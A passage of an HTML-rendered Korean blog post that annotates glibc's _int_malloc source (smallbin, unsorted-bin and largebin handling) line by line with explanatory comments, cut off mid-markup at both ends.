class="line">      <span class="comment">// bin에 av-&gt;bin의 idx에 해당하는 small bin 주소 저장</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">      <span class="comment">// victim에 bin의 마지막 chunk(bin-&gt;bk)를 저장 (LIFO-last in first out)</span></span><br><span class="line">      <span class="comment">// victim이 NULL인 경우, malloc함수가 최초로 실행된 것</span></span><br><span class="line">      <span class="comment">// victim이 bin인 경우, 해당 bin은 비어있는 것</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">          <span class="comment">// victim이 NULL인 경우,</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">            <span class="comment">// malloc_consolidate 함수 호출 (존재하는 fastbin 병합)</span></span><br><span class="line">          <span class="keyword">else</span> </span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    <span class="comment">// bck-&gt;fd = victim-&gt;bk-&gt;fd 가 자기 자신(victim)이 아닐경우</span></span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                  <span class="comment">// &quot;malloc(): smallbin double linked list corrupted&quot; exception 발생</span></span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">              <span class="comment">// victim의 물리적으로 위치한 다음 chunk(victim+nb)의 inuse flag를 1로 set</span></span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              <span class="comment">// bin의 마지막 chunk를 victim-&gt;bk로 설정</span></span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line">              <span class="comment">// victim-&gt;bk-&gt;fd를 bin으로 설정</span></span><br><span class="line">              <span class="comment">// bin에서 victim 제거 과정 (double linked list)</span></span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">              <span class="comment">// av가 main_arena가 아니라면</span></span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">                <span class="comment">// victim에 NON_MAIN_ARENA flag 설정</span></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">              <span class="comment">// 할당된 chunk 주소 리턴</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="comment">// largebin인 경우</span></span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">      <span class="comment">// av에 fastchunk가 있으면,</span></span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">        <span class="comment">// malloc_consolidate 함수 호출 (존재하는 fastbin 병합)</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     Process recently freed or remaindered chunks, taking one only if</span></span><br><span class="line"><span class="comment">     it is exact fit, or, if this a small request, the chunk is remainder from</span></span><br><span class="line"><span class="comment">     the most recent non-exact fit.  Place other traversed chunks in</span></span><br><span class="line"><span class="comment">     bins.  Note that this step is the only place in any routine where</span></span><br><span class="line"><span class="comment">     chunks are placed in bins.</span></span><br><span class="line"><span class="comment">     The outer loop here is needed because we might not realize until</span></span><br><span class="line"><span class="comment">     near the end of malloc that we should have consolidated, so must</span></span><br><span class="line"><span class="comment">     do so and retry. This happens at most once, and only when we would</span></span><br><span class="line"><span class="comment">     otherwise need to expand memory to service a &quot;small&quot; request.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">      <span class="comment">// unsorted bin list의 마지막 chunk를 victim에 저장</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">        <span class="comment">// victim-&gt;size가 특정 범위를 벗어나면 &quot;malloc(): memory corruption&quot; exception 발생</span></span><br><span class="line">          size = chunksize (victim);</span><br><span class="line">        <span class="comment">// size에 flag를 제외한 크기 저장</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">            bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">            victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">            (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">  <span class="comment">// smallbin 사이즈이고,  unsorted bin의 맨 마지막 chunk이고,</span></span><br><span class="line">  <span class="comment">// last_remainder chunk이며, chunk의 size가 nb + 최소크기보다 크면, </span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">            <span class="comment">// 해당 chunk를 두 개의 chunk로 split</span></span><br><span class="line">            remainder_size = size - nb;</span><br><span class="line">            <span class="comment">// remainder_size = chunk의 size - 요청한 크기 nb</span></span><br><span class="line">            remainder = chunk_at_offset (victim, nb);</span><br><span class="line">            <span class="comment">// remainder = victim + nb 위치, remainder_chunk를 split 하기 위한 offset</span></span><br><span class="line">            unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">            <span class="comment">// unsorted bin에 remainder 저장</span></span><br><span class="line">            av-&gt;last_remainder = remainder;</span><br><span class="line">            <span class="comment">// last_remainder 업데이트</span></span><br><span class="line">            remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">            <span class="comment">// remainder의 bk, fd에 unsorted_chunk 포인터 저장 (use memory leak)</span></span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">            <span class="comment">// remainder_size가 largebin 크기 라면,</span></span><br><span class="line">              &#123;</span><br><span class="line">                remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                <span class="comment">// fd_nextsize, bk_nextsize 초기화</span></span><br><span class="line">              &#125;</span><br><span class="line"></span><br><span class="line">            set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                      (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">            <span class="comment">// victim-&gt;size에 nb | PREV_INUSE | NON_MAIN_ARENA 한 값을 set</span></span><br><span class="line">            set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">            <span class="comment">// remainder-&gt;size에 remainder_size | PREV_INUSE 한 값을 set</span></span><br><span class="line">            set_foot (remainder, remainder_size);</span><br><span class="line">            <span class="comment">// remainder의 물리적 다음 chunk의 prev_size를 remainder_size로 set</span></span><br><span class="line"></span><br><span class="line">            check_malloced_chunk (av, victim, nb);</span><br><span class="line">            <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">            <span class="comment">// 할당된 chunk 주소 리턴</span></span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">          <span class="comment">// (확인중인 index) victim을 unlink함  </span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">          <span class="comment">// 요청한 크기와 victim의 크기가 같을 경우</span></span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="comment">// victim의 물리적 다음 chunk의 size에 prev_inuse flag set</span></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">     <span class="comment">// main_arena가 아니라면 victim의 물리적 다음 chunk의 size에 NON_MAIN_ARENA flag set</span></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">              <span class="comment">// 할당된 chunk 주소 리턴</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line">   <span class="comment">// 남아있는 bin을 크기에 맞춰 smallbin, largebin으로 보내는 작업</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">          <span class="comment">// size가 smallbin 크기이면,</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              <span class="comment">// victim_index에 size에 해당하는 smallbin binlist의 index 저장</span></span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              <span class="comment">// binlist에서 index에 해당하는 bin 주소를 bck에 저장</span></span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">              <span class="comment">// fwd에 bck-&gt;fd 저장 </span></span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="comment">//size가 largebin 크기이면,</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              <span class="comment">// victim_index에 size에 해당하는 largebin binlist의 index 저장</span></span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              <span class="comment">// binlist에서 index에 해당하는 bin 주소를 bck에 저장</span></span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">              <span class="comment">// fwd에 bck-&gt;fd 저장</span></span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">              <span class="comment">// bck-&gt;fd != bck (해당 large bin list가 비어있지 않으면)</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">// size에 PREV_INUSE flag를 set</span></span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="comment">// bck-&gt;bk-&gt;size에 NON_MAIN_ARENA flag가 설정되어있을 경우 종료</span></span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                  <span class="comment">// victim의 크기가 bck-&gt;bk-&gt;size보다 작을 경우</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                      <span class="comment">// victim을 해당 double linked list에 삽입</span></span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span> <span class="comment">// victim의 크기가 bck-&gt;bk-&gt;size보다 클 경우</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="comment">// fwd-&gt;size에 NON_MAIN_ARENA flag가 설정되어 있으면 종료</span></span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                      <span class="comment">// victim의 size가 fwd-&gt;size보다 같거나 클 때 까지</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                          <span class="comment">// 해당 작업을 반복</span></span><br><span class="line">                          <span class="comment">// 크기 순으로 정렬되는 large bin에 victim이 추가될 위치 찾는 작업</span></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">                      <span class="comment">// victim의 size와 fwd-&gt;size가 같다면</span></span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                        <span class="comment">// fwd에 fwd-&gt;fd 저장, 다음 위치 index를 불러옴</span></span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                      <span class="comment">// victim의 size와 fwd-&gt;size가 같지 않다면</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                          <span class="comment">// list에 victim 추가 </span></span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                      <span class="comment">// bck에 fwd-&gt;bk 저장</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span> <span class="comment">// large bin이 비어있으면</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">                <span class="comment">// victim의 fd_nextsize, bk_nextsize를 자기자신으로</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line">          <span class="comment">// victim을 크기에 맞는 smallbin/largebin에 추가</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 이 과정을 최대 10000회 반복</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">         sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">      <span class="comment">// 요청한 크기 nb가 largebin 크기라면,</span></span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);</span><br><span class="line">          <span class="comment">// largebin에서 해당 크기의 index에 위치한 bin 주소를 저장</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">   <span class="comment">// 만약 largebin이 비어있지 않고, largebin의 첫번째 chunk의 size가 nb보다 크거나 같으면</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              <span class="comment">// largebin 에서 크기가 가장 작은 chunk를 저장</span></span><br><span class="line">              <span class="comment">// 만약 largebin에 자기 자신만 있으면 bk_nextsize은 자기 자신을 가리킴</span></span><br><span class="line">              <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">                      <span class="comment">// victim의 크기가 요청한 크기보다 커질 때 까지 </span></span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span class="line"><span class="comment">// 해당 작업 반복 (해당 large bin 뒤에서부터 앞으로 scan해서 적절한 chunk 찾기</span></span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">              <span class="comment">// victim이 large bin의 마지막 chunk가 아니고, </span></span><br><span class="line">              <span class="comment">// victim의 크기가 victim의 다음 chunk의 크기와 같으면</span></span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"><span class="comment">// victim에 victim의 다음 chunk 저장</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              <span class="comment">// remainder_size에 chunk의 size - 요청한 크기 nb 값을 저장</span></span><br><span class="line">              unlink (av, victim, bck, fwd);</span><br><span class="line">  <span class="comment">// largebin에서 victim을 unlink</span></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">              <span class="comment">// remainder_size가 MINSIZE보다 작으면,</span></span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="comment">// victim의 다음 chunk (remainder_chunk)의 PREV_INUSE flag 1로 set</span></span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">                    <span class="comment">// remainder_chunk의 NON_MAIN_ARENA flag set</span></span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span> <span class="comment">// remainder_size가 MINSIZE보다 같거나 크면,</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                  <span class="comment">// remainder에 remainder_chunk의 주소 저장</span></span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  <span class="comment">// unsorted bin의 주소를 bck에 저장</span></span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">                  <span class="comment">// fwd에 unsroted bin-&gt;fd 저장</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                    &#123;</span><br><span class="line">                      errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                      <span class="keyword">goto</span> errout;</span><br><span class="line">                    &#125;</span><br><span class="line">        <span class="comment">// bck-&gt;fd-&gt;bk != bck 일 경우 &quot;malloc(): corrupted unsorted chunks&quot; exception</span></span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  <span class="comment">// remainder를 unsorted bin 맨 앞에 추가</span></span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                  <span class="comment">// remainder_size가 largebin 크기일 경우</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      <span class="comment">// fd_nextsize, bk_nextsize를 초기화</span></span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                  <span class="comment">// split된 victim의 PREV_INUSE,NON_MAIN_ARENA flag set</span></span><br><span class="line">                  <span class="comment">// remainder의 flag set</span></span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">              <span class="comment">// 할당된 chunk 주소 리턴</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 